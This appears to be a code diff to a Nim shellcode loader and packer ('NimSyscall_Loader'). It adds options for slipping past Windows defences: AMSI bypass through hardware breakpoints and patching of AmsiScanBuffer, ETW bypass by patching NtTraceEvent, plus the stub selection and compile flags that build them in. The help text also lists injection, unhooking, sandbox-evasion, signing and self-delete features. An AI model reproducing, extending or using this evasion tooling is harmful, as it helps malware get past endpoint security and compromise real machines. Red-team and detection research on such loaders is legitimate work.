@@ -64,7 +64,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.8
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -123,6 +123,9 @@ Options:
   --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation
   --sgn    Encode shellcode via SGN before encrypting it´
   --replace    Replace common nim IoC's in the loader like the string 'nim'
+  --noOneShot    By default the Packer uses Hardware Breakpoints to bypass AMSI, but disables it after the payload has been executed. If you want to keep it enabled for the current Thread, use this option.
+  --PatchAMSI    Bypass AMSI by patching an offset of amsi.dll/AmsiScanBuffer via Syscalls
+  --PatchETW    Bypass ETW by patching ntdll.dll/NtTraceEvent via Syscalls
   --AMSIProviderPatch    Patch all AMSI Providers instead of 'amsi.dll' (https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)
   --AMSINtCreateSectionHook    Hook NtCreateSection to prevent 'amsi.dll' from being loaded (https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/)
   --sandbox value    Include Sandbox Checks of your choice into the loader:
@@ -233,9 +236,12 @@ var
     arguments: string = ""
     embeddedArguments : bool = false
     AMSI: bool = true
+    oneShot: bool = true
+    AMSIPatch: bool = false
     AMSIProviderPatch: bool = false
     AMSICreateSectionHook: bool = false
     ETW: bool = true
+    ETWPatch: bool = false
     COMVARETW: bool = false
     shellcode: bool = true
     RWX: bool = false
@@ -339,6 +345,14 @@ if args["--peload"]:
   peload = true
   shellcode = false
   csharp = false
+
+if args["--PatchAMSI"]:
+  AMSIPatch = true
+  AMSI = false
+
+if args["--PatchETW"]:
+  ETWPatch = true
+  ETW = false
 
 if args["--shellcodeFile"]:
     retrieveFromFile = true
@@ -1381,6 +1395,9 @@ when defined(COMVARETW):
     from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
     from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
 
+when defined(HardwareETW):
+    from winim import CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,TH32CS_SNAPTHREAD,THREADENTRY32,Thread32First,Thread32Next
+
 when not defined(proxy):
     when defined(notcloned):
         import strenc
@@ -1916,6 +1933,17 @@ let NotepadProcIDStub * = fmt"""
 """
 let MainStub * = """
 
+when not defined(DInvoke):
+    when defined(unhook):
+        from winim import GetModuleInformation
+        type
+          MODULEINFO {.pure.} = object
+          lpBaseOfDll: LPVOID
+          SizeOfImage: DWORD
+          EntryPoint: LPVOID
+        LPMODULEINFO = ptr MODULEINFO
+
+
 proc main(lpParameter: LPVOID) : DWORD {.stdcall.} =
 
 """
@@ -2016,6 +2044,13 @@ if (AMSICreateSectionHook):
     stub.add(AmsiNtCreateSectionDecryptStub)
     stub.add(AMSINtCreateSectionHookStubFirst)
 
+if(AMSI or ETW):
+    stub.add(HardwareBreakpointStub)
+    if(AMSI):
+        stub.add(AMSIExceptionHandlerStub)
+    if(ETW):
+        stub.add(ETWExceptionHandlerStub)
+
 stub.add(MainStub)
 
 stub.add(getRandStub())
@@ -2061,8 +2096,10 @@ if (AMSI or AMSIProviderPatch or ETW or peload or (localinject == false) or self
         stub.add(FileDeleteStub)
 stub.add(getRandStub())
 if (localinject):
-    if (AMSI):
+    if(AMSI):
         stub.add(AMSIStub)
+    elif(AMSIPatch):
+        stub.add(AMSIPatchStub)
     elif(AmsiProviderPatch):
         stub.add(AMSIProviderPatchStub)
     elif(AMSICreateSectionHook):
@@ -2070,8 +2107,10 @@ if (localinject):
     if (ETW):
         if (COMVARETW):
             stub.add(ETWCOMVARStub)
-        else:
+        elif(ETWPatch):
             stub.add(ETWPatchStub)
+        else:
+            stub.add(ETWStub)
 stub.add(getRandStub())
 if (remoteETWpatch or remoteAMSIpatch):
     stub.add(RemoteModuleHandleStub)
@@ -2335,8 +2374,14 @@ elif system.hostOS == "linux":
 if((existingprocessInjection == false) and (remoteinject)):
     basicCompileFlags.add("-d:spawninject ")
 
+if(ETW):
+    basicCompileFlags.add("-d:HardwareETW ")
+
 if(RWX == false):
     basicCompileFlags.add("-d:RX ")
+
+if(AMSI and oneShot):
+    basicCompileFlags.add("-d:oneshot ")
 
 if (dllProxy):
     basicCompileFlags.add("--mm:orc --threads:on ")
